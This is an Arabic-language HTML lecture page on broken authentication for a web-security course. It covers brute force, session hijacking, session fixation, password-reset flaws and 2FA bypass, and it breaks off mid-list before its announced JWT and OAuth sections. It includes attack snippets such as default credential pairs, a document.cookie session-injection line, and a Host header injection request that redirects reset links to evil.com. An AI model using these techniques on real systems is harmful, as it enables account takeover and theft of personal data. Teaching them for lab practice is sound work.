<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>محاضرة Broken Authentication + OAuth</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/themes/prism-okaidia.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Google Sans', 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; line-height: 1.6; color: #e8eaed; background: #151b2f; min-height: 100vh; }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        .header { text-align: center; margin-bottom: 48px; padding: 64px 24px; background: linear-gradient(135deg, #1a2125, #203942); border-radius: 12px; box-shadow: 0 4px 24px rgb(33, 48, 70); }
        .header h1 { font-size: 2.5rem; font-weight: 400; color: #ffffff; margin-bottom: 16px; letter-spacing: -0.5px; }
        .header .subtitle { font-size: 1.1rem; font-weight: 300; color: rgba(255, 255, 255, 0.9); margin-bottom: 24px; }
        .lecture-info { display: flex; justify-content: center; gap: 30px; flex-wrap: wrap; margin-top: 20px; }
        .info-item { background: rgba(255, 255, 255, 0.2); padding: 12px 24px; border-radius: 24px; border: 1px solid rgba(255, 255, 255, 0.3); color: #ffffff; font-weight: 500; }
        .info-item i { color: #ffffff; margin-left: 8px; }
        .nav-menu { background: #1a2332; border-radius: 12px; padding: 24px; margin-bottom: 32px; border: 1px solid #2d3748; box-shadow: 0 1px 6px rgba(26, 35, 50, 0.4); }
        .nav-menu h3 { color: #e8eaed; font-size: 1.5rem; font-weight: 500; margin-bottom: 20px; text-align: center; }
        .nav-menu ul { list-style: none; display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 10px; }
        .nav-menu a { display: flex; align-items: center; padding: 12px 16px; color: #e8eaed; text-decoration: none; border-radius: 8px; transition: all 0.2s ease; border: 1px solid transparent; }
        .nav-menu a:hover { background: #2d3748; border-color: #3b475d; }
        section { background: #0f1724; border: 1px solid #2b3447; border-radius: 12px; padding: 24px; margin-bottom: 24px; box-shadow: 0 1px 6px rgba(33, 48, 70, 0.3); }
        h2 { color: #ffffff; font-size: 1.6rem; margin-bottom: 12px; display: flex; align-items: center; gap: 10px; }
        h3 { color: #a5b4fc; font-size: 1.2rem; margin: 14px 0; }
        h4 { color: #c7d2fe; font-size: 1.1rem; margin: 12px 0 8px 0; font-weight: 500; }
        p { color: #c7d2fe; margin-bottom: 12px; line-height: 1.7; }
        .list { margin: 10px 0 0 0; padding-right: 18px; color: #c7d2fe; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 16px; margin: 20px 0; }
        .card { background: #0c1220; border: 1px solid #263148; border-radius: 10px; padding: 18px; }
        .code-block { 
            background: #0d1117; 
            border: 1px solid #30363d; 
            border-radius: 6px; 
            padding: 16px; 
            color: #f0f6fc; 
            font-family: 'SFMono-Regular', 'Consolas', 'Liberation Mono', 'Menlo', monospace; 
            overflow-x: auto; 
            margin: 16px 0; 
            font-size: 14px; 
            line-height: 1.45;
            box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
            white-space: pre-wrap;
        }
        .tip { background: rgba(16, 185, 129, 0.08); border: 1px solid rgba(16, 185, 129, 0.25); color: #d1fae5; border-radius: 8px; padding: 12px 16px; margin: 16px 0; }
        .warn { background: rgba(245, 158, 11, 0.08); border: 1px solid rgba(245, 158, 11, 0.25); color: #fde68a; border-radius: 8px; padding: 12px 16px; margin: 16px 0; }
        .danger { background: rgba(239, 68, 68, 0.08); border: 1px solid rgba(239, 68, 68, 0.25); color: #fecaca; border-radius: 8px; padding: 12px 16px; margin: 16px 0; }
        .attack-demo { background: #1a1a2e; border: 1px solid #16213e; border-radius: 10px; padding: 20px; margin: 16px 0; }
        .attack-demo h4 { color: #ff6b6b; margin-bottom: 12px; }
        .lab-card { background: linear-gradient(135deg, #1e3a8a, #1e40af); border: 1px solid #3b82f6; border-radius: 12px; padding: 20px; margin: 12px 0; }
        .lab-card h4 { color: #ffffff; margin-bottom: 8px; }
        .lab-card p { color: #dbeafe; font-size: 0.95rem; }
        .lab-link { display: inline-block; background: #3b82f6; color: #e8eaed; padding: 8px 16px; border-radius: 6px; text-decoration: none; margin-top: 10px; font-size: 0.9rem; }
        .lab-link:hover { background: #2563eb; }
        .mermaid { 
            background: #1a2332 !important; 
            border: 1px solid #2d3748; 
            border-radius: 8px; 
            padding: 16px; 
            margin: 16px 0; 
            color: #e8eaed !important;
        }
        
        /* تأكيد أن جميع عناصر Mermaid تستخدم الألوان الداكنة */
        .mermaid svg {
            background: #1a2332 !important;
        }
        
        .mermaid .node rect, .mermaid .node circle, .mermaid .node ellipse, .mermaid .node polygon {
            fill: #1a2332 !important;
            stroke: #2d3748 !important;
            color: #e8eaed !important;
        }
        
        .mermaid .edgeLabel {
            background-color: #1a2332 !important;
            color: #e8eaed !important;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1><i class="fas fa-user-lock"></i> Broken Authentication + OAuth 2.0</h1>
            <div class="subtitle">مصادقة ضعيفة، إدارة جلسات غير آمنة، وأخطاء تكامل OAuth</div>
            <div class="lecture-info">
                <div class="info-item"><i class="fas fa-clock"></i> ساعتان</div>
                <div class="info-item"><i class="fas fa-flask"></i> 15 مختبر</div>
                <div class="info-item"><i class="fas fa-signal"></i> متوسط إلى متقدم</div>
                <div class="info-item"><i class="fas fa-shield-alt"></i> حماية شاملة</div>
            </div>
        </div>

        <div class="nav-menu">
            <h3>محتويات المحاضرة</h3>
            <ul>
                <li><a href="#intro"><i class="fas fa-info-circle"></i> مقدمة</a></li>
                <li><a href="#auth-basics"><i class="fas fa-key"></i> أساسيات المصادقة وإدارة الجلسات</a></li>
                <li><a href="#broken-auth-types"><i class="fas fa-lock-open"></i> أنواع Broken Authentication</a></li>
                <li><a href="#jwt-basics"><i class="fas fa-shield-alt"></i> مقدمة JWT: التوقيع vs التشفير</a></li>
                <li><a href="#jwt-attacks"><i class="fas fa-bomb"></i> هجمات JWT (JWS)</a></li>
                <li><a href="#jwe-attacks"><i class="fas fa-lock"></i> هجمات JWE (التشفير)</a></li>
                <li><a href="#oauth-basics"><i class="fab fa-osi"></i> أساسيات OAuth 2.0</a></li>
                <li><a href="#oauth-attacks"><i class="fas fa-bug"></i> هجمات OAuth الشائعة</a></li>
                <li><a href="#labs"><i class="fas fa-flask"></i> مختبرات عملية (10)</a></li>
                <li><a href="#defense"><i class="fas fa-shield-halved"></i> طرق الحماية</a></li>
                <li><a href="#summary"><i class="fas fa-list-check"></i> الخلاصة</a></li>
            </ul>
        </div>

        <section id="intro">
            <h2><i class="fas fa-info-circle"></i> مقدمة - ما هو Broken Authentication؟</h2>
            
            <p>مرحباً بكم في المحاضرة الخامسة من سلسلة أمان تطبيقات الويب! 🎯</p>
            
            <p>تخيل أن منزلك له قفل إلكتروني، ولكن هذا القفل به عيوب: أحياناً يفتح بكلمة مرور خاطئة، وأحياناً ينسى أن يتحقق من هويتك، وأحياناً يمكن خداعه بسهولة. هذا بالضبط ما يحدث في <strong>ثغرات Broken Authentication</strong>!</p>

            <p><strong>Broken Authentication</strong> هي واحدة من أخطر الثغرات في تطبيقات الويب حسب OWASP Top 10. تحدث عندما يفشل التطبيق في التحقق من هوية المستخدمين بشكل صحيح، مما يسمح للمهاجمين بالوصول غير المشروع للحسابات.</p>
            
            <div class="tip">
                <h4><i class="fas fa-lightbulb"></i> ما ستتعلمه في هذه المحاضرة</h4>
                <ul class="list">
                    <li>🎯 فهم مفهوم المصادقة المكسورة من الصفر بأمثلة عملية</li>
                    <li>🖼️ رسوم توضيحية تشرح كيف تعمل الثغرات بصرياً</li>
                    <li>🔐 شرح مفصل لـ JWT وأنواع التشفير (JWS vs JWE)</li>
                    <li>🔓 OAuth 2.0 وثغراته الشائعة مع أمثلة حقيقية</li>
                    <li>⚔️ 8 أنواع مختلفة من هجمات المصادقة</li>
                    <li>🧪 15 مختبر عملي متدرج الصعوبة من PortSwigger</li>
                    <li>🛡️ طرق الحماية الشاملة والدفاع</li>
                    <li>🔧 أدوات الاختبار والاكتشاف المتقدمة</li>
                </ul>
            </div>

            <div class="mermaid">
graph TD
    A[المستخدم يحاول تسجيل الدخول] --> B{التطبيق الآمن؟}
    B -->|✅ آمن| C[يتحقق من كلمة المرور]
    B -->|❌ غير آمن| D[يقبل كلمة مرور ضعيفة]
    
    C --> E{كلمة المرور صحيحة؟}
    E -->|نعم| F[ينشئ جلسة آمنة]
    E -->|لا| G[يرفض الدخول]
    
    D --> H[ينشئ جلسة غير آمنة]
    F --> I[المستخدم يدخل بأمان]
    H --> J[❌ المهاجم يمكنه اختطاف الجلسة]
    G --> K[المستخدم محمي]
    
    style D fill:#ffebee
    style H fill:#ffebee  
    style J fill:#ffebee
    style F fill:#e8f5e8
    style I fill:#e8f5e8
    style K fill:#e8f5e8
            </div>

            <div class="danger">
                <h4><i class="fas fa-exclamation-triangle"></i> لماذا Broken Authentication خطيرة جداً؟</h4>
                <p>تخيل أن شخص غريب يستطيع فتح باب منزلك، والدخول لحسابك البنكي، وقراءة رسائلك الخاصة، والتسوق باسمك! هذا بالضبط ما يحدث عندما تكون المصادقة مكسورة:</p>
                <ul class="list">
                    <li><strong>💰 خسائر مالية:</strong> سرقة الأموال من الحسابات البنكية</li>
                    <li><strong>🔐 اختراق الحسابات:</strong> الوصول لحسابات التواصل الاجتماعي والبريد الإلكتروني</li>
                    <li><strong>📱 سرقة الهوية:</strong> انتحال شخصية المستخدمين</li>
                    <li><strong>📊 تسريب البيانات:</strong> كشف معلومات شخصية حساسة</li>
                    <li><strong>🏢 ضرر السمعة:</strong> فقدان ثقة العملاء في الشركة</li>
                </ul>
            </div>

            <div class="warn">
                <h4>📋 ملاحظات مهمة للمختبرات</h4>
                <ul class="list">
                    <li><strong>PortSwigger Labs:</strong> جميع المختبرات تتطلب حساب مجاني على PortSwigger Academy</li>
                    <li><strong>Exploit Server:</strong> في المختبرات، "YOUR-EXPLOIT-SERVER" يشير للخادم المقدم من PortSwigger</li>
                    <li><strong>Burp Suite:</strong> استخدم Burp Suite Community (مجاني) أو Professional لحل المختبرات</li>
                    <li><strong>التعلم الآمن:</strong> جميع المختبرات في بيئة آمنة ومعزولة</li>
                </ul>
            </div>

            <div class="danger">
                <h4><i class="fas fa-exclamation-triangle"></i> تحذير مهم</h4>
                <p><strong>هذه المحاضرة لأغراض تعليمية فقط!</strong> 📚</p>
                <p>لا تستخدم هذه التقنيات على أنظمة لا تملك إذناً قانونياً لاختبارها. الاستخدام غير المشروع لهذه التقنيات قد يعرضك للمساءلة القانونية. استخدم المختبرات المخصصة للتعلم فقط.</p>
            </div>
        </section>

        <section id="auth-concept">
            <h2><i class="fas fa-lightbulb"></i> فهم المفهوم بالرسوم التوضيحية</h2>
            
            <h3><i class="fas fa-eye"></i> مثال بصري بسيط - مطعم مع نادل</h3>
            
            <div class="attack-demo">
                <h4>🍽️ مثال المطعم - سيناريو المصادقة</h4>
                <div class="mermaid">
graph TD
    subgraph "مطعم آمن ✅"
        A1[زبون جديد يدخل المطعم] --> B1[النادل: ما اسمك؟]
        B1 --> C1[الزبون: أحمد محمد]
        C1 --> D1[النادل: هل لديك حجز؟]
        D1 --> E1[الزبون: نعم، رقم الحجز 1234]
        E1 --> F1[النادل يتحقق من قائمة الحجوزات]
        F1 --> G1[✅ الحجز موجود]
        G1 --> H1[النادل: تفضل طاولتك رقم 5]
    end
    
    subgraph "مطعم غير آمن ❌"
        A2[مهاجم يدخل المطعم] --> B2[النادل: ما اسمك؟]
        B2 --> C2[المهاجم: أحمد محمد]
        C2 --> D2[❌ النادل لا يطلب إثبات هوية]
        D2 --> E2[النادل: تفضل أي طاولة تريد]
        E2 --> F2[❌ المهاجم يجلس في طاولة شخص آخر]
        F2 --> G2[❌ يأكل طعام الآخرين مجاناً]
    end
    
    style A2 fill:#ffebee
    style D2 fill:#ffebee
    style E2 fill:#ffebee
    style F2 fill:#ffebee
    style G2 fill:#ffebee
                </div>
                
                <p><strong>في عالم التطبيقات:</strong> النادل = التطبيق، الحجز = كلمة المرور، الطاولة = الحساب الشخصي</p>
            </div>

            <div class="attack-demo">
                <h4>📊 مقارنة: التطبيق الآمن vs غير الآمن</h4>
                <div class="mermaid">
graph LR
    subgraph "تطبيق آمن ✅"
        A1[المستخدم يدخل<br/>username + password] --> B1[التطبيق يتحقق<br/>من قاعدة البيانات]
        B1 --> C1{كلمة المرور<br/>صحيحة؟}
        C1 -->|نعم| D1[ينشئ session آمنة<br/>مع انتهاء صلاحية]
        C1 -->|لا| E1[يرفض الدخول<br/>ويسجل المحاولة]
        D1 --> F1[يدخل المستخدم<br/>بأمان]
    end
    
    subgraph "تطبيق غير آمن ❌"
        A2[المستخدم يدخل<br/>username + password] --> B2[❌ التطبيق لا يتحقق<br/>أو يتحقق بشكل ضعيف]
        B2 --> C2[❌ يقبل كلمات مرور<br/>ضعيفة أو فارغة]
        C2 --> D2[❌ ينشئ session غير آمنة<br/>بدون انتهاء صلاحية]
        D2 --> E2[❌ يمكن للمهاجم<br/>اختطاف الجلسة]
    end
    
    style A2 fill:#ffebee
    style B2 fill:#ffebee
    style C2 fill:#ffebee
    style D2 fill:#ffebee
    style E2 fill:#ffebee
                </div>
            </div>

            <div class="tip">
                <h4><i class="fas fa-brain"></i> نصائح لفهم Broken Authentication بسهولة</h4>
                <ul class="list">
                    <li><strong>🔑 القاعدة الذهبية:</strong> أي تطبيق لا يتحقق جيداً من هويتك = خطر</li>
                    <li><strong>🎯 ابحث عن:</strong> صفحات تسجيل الدخول، reset password، تغيير كلمة المرور</li>
                    <li><strong>🧪 اختبر دائماً:</strong> كلمات مرور ضعيفة، جلسات منتهية الصلاحية</li>
                    <li><strong>⚠️ علامات الخطر:</strong> إذا دخلت بكلمة مرور خاطئة = ثغرة موجودة</li>
                </ul>
            </div>
        </section>

        <section id="auth-basics">
            <h2><i class="fas fa-key"></i> أساسيات المصادقة وإدارة الجلسات</h2>
            
            <h3><i class="fas fa-question-circle"></i> ما الفرق بين Authentication و Authorization؟</h3>
            
            <div class="mermaid">
graph TD
    A[مستخدم يريد الدخول] --> B[Authentication: من أنت؟]
    B --> C[يدخل username + password]
    C --> D{هل البيانات صحيحة؟}
    D -->|نعم| E[✅ تم التحقق من الهوية]
    D -->|لا| F[❌ رفض الدخول]
    
    E --> G[Authorization: ماذا يحق لك أن تفعل؟]
    G --> H[التحقق من الصلاحيات]
    H --> I[عرض المحتوى المسموح فقط]
    
    style E fill:#e8f5e8
    style F fill:#ffebee
    style I fill:#e8f5e8
            </div>

            <div class="grid">
                <div class="card">
                    <h3>🔐 Authentication (المصادقة)</h3>
                    <ul class="list">
                        <li><strong>السؤال:</strong> من أنت؟</li>
                        <li><strong>الهدف:</strong> التحقق من هوية المستخدم</li>
                        <li><strong>الطرق:</strong> username/password، بصمة، رمز SMS</li>
                        <li><strong>المثال:</strong> إدخال كلمة المرور لفتح الهاتف</li>
                    </ul>
                </div>
                
                <div class="card">
                    <h3>🔑 Authorization (التفويض)</h3>
                    <ul class="list">
                        <li><strong>السؤال:</strong> ماذا يحق لك أن تفعل؟</li>
                        <li><strong>الهدف:</strong> تحديد الصلاحيات والأذونات</li>
                        <li><strong>الطرق:</strong> Roles، Permissions، ACLs</li>
                        <li><strong>المثال:</strong> هل يمكنك حذف هذا الملف؟</li>
                    </ul>
                </div>
                
                <div class="card">
                    <h3>🔄 Session Management (إدارة الجلسات)</h3>
                    <ul class="list">
                        <li><strong>الهدف:</strong> تتبع المستخدم بعد تسجيل الدخول</li>
                        <li><strong>الطرق:</strong> Cookies، JWT، Server Sessions</li>
                        <li><strong>المشكلة:</strong> جلسات غير آمنة أو منتهية الصلاحية</li>
                        <li><strong>المثال:</strong> البقاء مسجل دخول في موقع التسوق</li>
                    </ul>
                </div>
                <div class="card">
                    <h3>الجلسات وملفات تعريف الارتباط</h3>
                    <ul class="list">
                        <li>HttpOnly, Secure, SameSite</li>
                        <li>Session Fixation, Session Hijacking</li>
                        <li>CSRF Tokens مع حماية SameSite</li>
                    </ul>
                </div>
            </div>
        </section>

        <section id="attack-scenarios">
            <h2><i class="fas fa-crosshairs"></i> سيناريوهات الهجوم الحقيقية</h2>

            <h3><i class="fas fa-shopping-cart"></i> سيناريو 1: متجر إلكتروني - كسر كلمة المرور</h3>
            <div class="attack-demo">
                <h4><i class="fas fa-route"></i> خطوات الهجوم</h4>
                <p><strong>الهدف:</strong> اختراق حسابات العملاء في متجر إلكتروني</p>
                
                <div class="mermaid">
graph TD
    A[المهاجم يكتشف صفحة تسجيل الدخول] --> B[يجرب كلمات مرور شائعة]
    B --> C{التطبيق يحمي من<br/>Brute Force؟}
    C -->|لا ❌| D[يستخدم قائمة كلمات مرور]
    C -->|نعم ✅| E[الهجوم يفشل]
    
    D --> F[password, 123456, admin]
    F --> G[يجد حسابات بكلمات مرور ضعيفة]
    G --> H[يدخل لحسابات العملاء]
    H --> I[يسرق معلومات الدفع والعناوين]
    
    style C fill:#ffebee
    style D fill:#ffebee
    style F fill:#ffebee
    style G fill:#ffebee
    style H fill:#ffebee
    style I fill:#ffebee
    style E fill:#e8f5e8
                </div>
                
                <div class="code-block">
# خطوات الهجوم العملية:
1. المهاجم يجد: https://shop.com/login
2. يجرب حسابات شائعة:
   - admin:admin
   - admin:password
   - test@shop.com:123456
3. إذا لم يكن هناك rate limiting:
   - يستخدم Burp Suite Intruder
   - يحمل قائمة 1000 كلمة مرور شائعة
   - يجرب على كل حساب عميل
4. النتيجة: يخترق 5-10% من الحسابات!

البيانات المسربة:
- أسماء وعناوين العملاء
- أرقام بطاقات ائتمان (آخر 4 أرقام)
- تاريخ الطلبات والمشتريات
- أرقام الهواتف
                </div>
            </div>

            <h3><i class="fas fa-university"></i> سيناريو 2: نظام جامعي - Session Hijacking</h3>
            <div class="attack-demo">
                <h4><i class="fas fa-route"></i> خطوات الهجوم</h4>
                <p><strong>الهدف:</strong> سرقة جلسات الطلاب للوصول لدرجاتهم وتعديلها</p>
                
                <div class="mermaid">
graph TD
    A[طالب يسجل دخول في مقهى إنترنت] --> B[يستخدم شبكة WiFi عامة]
    B --> C[المهاجم في نفس المقهى]
    C --> D[يستخدم Wireshark لمراقبة الشبكة]
    D --> E{هل الموقع يستخدم HTTPS؟}
    
    E -->|لا ❌| F[يسرق session cookie بسهولة]
    E -->|نعم ولكن...| G[يبحث عن Mixed Content]
    
    F --> H[يستخدم Cookie المسروق]
    G --> I[يجد طلبات HTTP غير مشفرة]
    I --> J[يسرق session من الطلبات غير الآمنة]
    
    H --> K[يدخل كالطالب الضحية]
    J --> K
    K --> L[يعدل الدرجات أو يسجل في مواد]
    
    style E fill:#ffebee
    style F fill:#ffebee
    style G fill:#ffebee
    style I fill:#ffebee
    style J fill:#ffebee
    style K fill:#ffebee
    style L fill:#ffebee
                </div>
                
                <div class="code-block">
# أدوات الهجوم:
1. Wireshark: لمراقبة حركة المرور
2. Burp Suite: لتحليل الطلبات
3. Cookie Editor: لتعديل cookies في المتصفح

# الكود المستخدم:
document.cookie = "JSESSIONID=ABC123XYZ789; domain=.university.edu";
location.reload(); // إعادة تحميل الصفحة بالـ session الجديد

# النتيجة:
- الوصول لحساب الطالب الضحية
- رؤية الدرجات والجدول الدراسي
- إمكانية التسجيل في مواد أو إلغاء التسجيل
- الوصول لمعلومات شخصية حساسة
                </div>
            </div>

            <h3><i class="fas fa-hospital"></i> سيناريو 3: نظام طبي - Password Reset Vulnerability</h3>
            <div class="attack-demo">
                <h4><i class="fas fa-route"></i> خطوات الهجوم</h4>
                <p><strong>الهدف:</strong> الوصول لسجلات المرضى الطبية</p>
                
                <div class="mermaid">
graph TD
    A[المهاجم يجد صفحة Password Reset] --> B[يدخل email الضحية]
    B --> C[النظام يرسل رابط reset]
    C --> D[المهاجم يحلل رابط Reset]
    D --> E{هل الرابط قابل للتنبؤ؟}
    
    E -->|نعم ❌| F[reset.php?token=123456]
    E -->|لا ولكن...| G[يبحث عن طرق أخرى]
    
    F --> H[يجرب أرقام متسلسلة]
    G --> I[يجرب Password Reset Poisoning]
    
    H --> J[يجد tokens صالحة]
    I --> K[يغير Host header ليوجه email له]
    
    J --> L[يغير كلمة مرور الضحية]
    K --> M[يحصل على reset token]
    M --> L
    
    L --> N[يدخل لحساب الطبيب/المريض]
    N --> O[يصل للسجلات الطبية الحساسة]
    
    style E fill:#ffebee
    style F fill:#ffebee
    style H fill:#ffebee
    style I fill:#ffebee
    style J fill:#ffebee
    style K fill:#ffebee
    style L fill:#ffebee
    style N fill:#ffebee
    style O fill:#ffebee
                </div>
                
                <div class="code-block">
# مثال Token ضعيف:
https://hospital.com/reset?token=1001
https://hospital.com/reset?token=1002  ← المهاجم يجرب
https://hospital.com/reset?token=1003

# Host Header Injection:
POST /forgot-password HTTP/1.1
Host: evil.com  ← تغيير الـ Host
Content-Type: application/x-www-form-urlencoded

email=doctor@hospital.com

# النتيجة:
Email يُرسل إلى doctor@hospital.com لكن الرابط يشير إلى:
https://evil.com/reset?token=ABC123

# البيانات المعرضة للخطر:
- سجلات طبية للمرضى
- تشخيصات ووصفات طبية
- معلومات التأمين الصحي
- بيانات شخصية حساسة (أمراض، عمليات)
                </div>
            </div>

            <div class="danger">
                <h4><i class="fas fa-exclamation-triangle"></i> تأثير Broken Authentication على القطاعات الحساسة</h4>
                <ul class="list">
                    <li><strong>🏥 القطاع الطبي:</strong> تسريب سجلات المرضى وانتهاك خصوصيتهم</li>
                    <li><strong>🏦 القطاع المصرفي:</strong> سرقة أموال وبيانات مالية حساسة</li>
                    <li><strong>🎓 القطاع التعليمي:</strong> تعديل درجات وسرقة هويات أكاديمية</li>
                    <li><strong>🏢 الشركات:</strong> تسريب أسرار تجارية ومعلومات موظفين</li>
                    <li><strong>🛒 التجارة الإلكترونية:</strong> سرقة بيانات عملاء ومعلومات دفع</li>
                </ul>
            </div>
        </section>

        <section id="broken-auth-types">
            <h2><i class="fas fa-lock-open"></i> أنواع Broken Authentication الثمانية</h2>
            
            <p>هناك 8 أنواع رئيسية من ثغرات المصادقة المكسورة، كل نوع له أساليب استغلال مختلفة ومستويات خطورة متفاوتة:</p>

            <div class="attack-demo">
                <h4>🔓 1. Credential Attacks - هجمات كلمات المرور</h4>
                <p>الأكثر شيوعاً وخطورة - يشمل جميع الهجمات على كلمات المرور</p>
                
                <div class="grid">
                    <div class="card">
                        <h4>🔨 Brute Force</h4>
                        <ul class="list">
                            <li><strong>الطريقة:</strong> تجريب جميع التركيبات الممكنة</li>
                            <li><strong>المثال:</strong> 0000, 0001, 0002... 9999</li>
                            <li><strong>الهدف:</strong> كلمات مرور قصيرة أو رقمية</li>
                            <li><strong>الوقت:</strong> ساعات إلى أيام</li>
                        </ul>
                    </div>
                    
                    <div class="card">
                        <h4>📚 Dictionary Attack</h4>
                        <ul class="list">
                            <li><strong>الطريقة:</strong> استخدام قوائم كلمات مرور شائعة</li>
                            <li><strong>المثال:</strong> password, 123456, admin</li>
                            <li><strong>الهدف:</strong> كلمات مرور ضعيفة</li>
                            <li><strong>الوقت:</strong> دقائق إلى ساعات</li>
                        </ul>
                    </div>
                    
                    <div class="card">
                        <h4>🔄 Credential Stuffing</h4>
                        <ul class="list">
                            <li><strong>الطريقة:</strong> استخدام كلمات مرور مسربة</li>
                            <li><strong>المصدر:</strong> تسريبات قواعد بيانات سابقة</li>
                            <li><strong>الهدف:</strong> مستخدمين يعيدون استخدام كلمات المرور</li>
                            <li><strong>النجاح:</strong> 0.1-2% من المحاولات</li>
                        </ul>
                    </div>
                    
                    <div class="card">
                        <h4>💧 Password Spraying</h4>
                        <ul class="list">
                            <li><strong>الطريقة:</strong> كلمة مرور واحدة على حسابات كثيرة</li>
                            <li><strong>المثال:</strong> تجريب "Password123" على 1000 حساب</li>
                            <li><strong>الميزة:</strong> يتجنب account lockout</li>
                            <li><strong>الهدف:</strong> شركات بسياسات كلمات مرور ضعيفة</li>
                        </ul>
                    </div>
                </div>
            </div>

            <div class="attack-demo">
                <h4>🍪 2. Session Management Issues - مشاكل إدارة الجلسات</h4>
                <p>ثاني أخطر الثغرات - استغلال ضعف في إدارة جلسات المستخدمين</p>
                
                <div class="mermaid">
graph TD
    A[المستخدم يسجل دخول] --> B[التطبيق ينشئ Session]
    B --> C{هل Session آمن؟}
    C -->|لا ❌| D[Session ID قابل للتنبؤ<br/>مثل: USER123_20250108]
    C -->|نعم ✅| E[Session ID عشوائي<br/>مثل: a7b2f4d8e9c1...]
    
    D --> F[المهاجم يخمن Session IDs أخرى]
    F --> G[يدخل كمستخدمين آخرين]
    
    E --> H[لا يمكن تخمين Session]
    H --> I[الجلسة آمنة]
    
    style C fill:#ffebee
    style D fill:#ffebee
    style F fill:#ffebee
    style G fill:#ffebee
    style E fill:#e8f5e8
    style H fill:#e8f5e8
    style I fill:#e8f5e8
                </div>
                
                <div class="grid">
                    <div class="card">
                        <h4>🔮 Predictable Session IDs</h4>
                        <p>Session IDs قابلة للتنبؤ أو تحتوي معلومات يمكن تخمينها</p>
                        <div class="code-block">
❌ أمثلة ضعيفة:
SESSIONID=USER123_20250108_001
JSESSIONID=12345
SESSION=admin_session_1

✅ أمثلة آمنة:
SESSIONID=a7b2f4d8e9c1a3b5f7d9e2c4a6b8d0f2
JSESSIONID=9f8e7d6c5b4a39281f7e6d5c4b3a2918
                        </div>
                    </div>
                    
                    <div class="card">
                        <h4>🔒 Session Fixation</h4>
                        <p>المهاجم يحدد Session ID ويخدع الضحية لاستخدامه</p>
                        <div class="code-block">
# خطوات الهجوم:
1. المهاجم يحصل على session: ABC123
2. يرسل رابط للضحية: 
   site.com/login?JSESSIONID=ABC123
3. الضحية تسجل دخول بنفس Session
4. المهاجم يستخدم ABC123 ويدخل كالضحية
                        </div>
                    </div>
                    
                    <div class="card">
                        <h4>♻️ Session Not Rotated</h4>
                        <p>عدم تغيير Session ID بعد تسجيل الدخول أو تغيير الصلاحيات</p>
                        <div class="code-block">
❌ المشكلة:
1. المستخدم يزور الموقع: SESSION=ABC123
2. يسجل دخول: لا يزال SESSION=ABC123
3. إذا سُرق ABC123 قبل الدخول، المهاجم يدخل

✅ الحل:
1. المستخدم يزور الموقع: SESSION=ABC123
2. يسجل دخول: SESSION=XYZ789 (جديد)
3. Session القديم لا يعمل بعد الآن
                        </div>
                    </div>
                    
                    <div class="card">
                        <h4>⏰ Session Timeout Issues</h4>
                        <p>جلسات لا تنتهي أو تنتهي بعد وقت طويل جداً</p>
                        <div class="code-block">
❌ مشاكل شائعة:
- Session لا ينتهي أبداً
- Session ينتهي بعد أسابيع
- عدم انتهاء Session عند إغلاق المتصفح
- عدم إنهاء Session عند Logout

✅ الممارسة الآمنة:
- انتهاء تلقائي خلال 30 دقيقة من عدم النشاط
- انتهاء فوري عند Logout
- انتهاء عند إغلاق المتصفح (للمواقع الحساسة)
                        </div>
                    </div>
                </div>
            </div>

            <div class="attack-demo">
                <h4>🔄 3. Password Reset Vulnerabilities - ثغرات استرداد كلمة المرور</h4>
                <p>استغلال ضعف في آلية إعادة تعيين كلمة المرور</p>
                
                <div class="grid">
                    <div class="card">
                        <h4>🎯 Weak Reset Tokens</h4>
                        <div class="code-block">
❌ Tokens ضعيفة:
reset.php?token=12345
reset.php?token=user123_20250108
reset.php?token=md5(email)

# كيف يستغل المهاجم:
1. يطلب reset لحسابه: token=12345
2. يجرب tokens أخرى: 12346, 12347...
3. يجد token صالح لمستخدم آخر
4. يغير كلمة مرور الضحية

✅ Tokens آمنة:
reset.php?token=a7b2f4d8e9c1a3b5f7d9e2c4a6b8d0f2
- 32+ حرف عشوائي
- تنتهي خلال 15 دقيقة
- تُستخدم مرة واحدة فقط
                        </div>
                    </div>
                    
                    <div class="card">
                        <h4>🌐 Host Header Injection</h4>
                        <div class="code-block">
# الهجوم:
POST /forgot-password HTTP/1.1
Host: evil.com  ← تغيير Host header
Content-Type: application/x-www-form-urlencoded

email=victim@company.com

# النتيجة:
Email يُرسل لـ victim@company.com لكن الرابط:
https://evil.com/reset?token=ABC123

# عندما تضغط الضحية الرابط:
- تذهب لموقع المهاجم
- المهاجم يحصل على reset token
- يستخدمه لتغيير كلمة مرور الضحية
                        </div>
                    </div>
                </div>
            </div>

            <div class="attack-demo">
                <h4>🔐 4. Multi-Factor Authentication (2FA) Bypass</h4>
                <p>تجاوز المصادقة الثنائية بسبب تطبيق خاطئ</p>
                
                <div class="mermaid">
graph TD
    A[المستخدم يدخل username/password] --> B[✅ كلمة المرور صحيحة]
    B --> C[النظام يطلب 2FA code]
    C --> D[المستخدم يدخل كود خاطئ]
    D --> E{هل النظام يتحقق<br/>من 2FA بشكل صحيح؟}
    E -->|لا ❌| F[يسمح بالدخول رغم كود خاطئ]
    E -->|نعم ✅| G[يرفض الدخول]
    
    F --> H[المهاجم يتجاوز 2FA]
    G --> I[2FA يعمل بشكل صحيح]
    
    style E fill:#ffebee
    style F fill:#ffebee
    style H fill:#ffebee
    style G fill:#e8f5e8
    style I fill:#e8f5e8
                </div>
                
                <div class="code-block">
# طرق تجاوز 2FA الشائعة:

1. Response Manipulation:
   - تغيير response من {"2fa_required": true} إلى false
   - تعديل status code من 401 إلى 200

2. Direct Access:
   - الدخول مباشرة لـ /dashboard بعد كلمة المرور
   - تجاهل خطوة 2FA

3. Brute Force 2FA:
   - تجريب جميع الأكواد من 000000 إلى 999999
   - استغلال عدم وجود rate limiting

4. Backup Code Abuse:
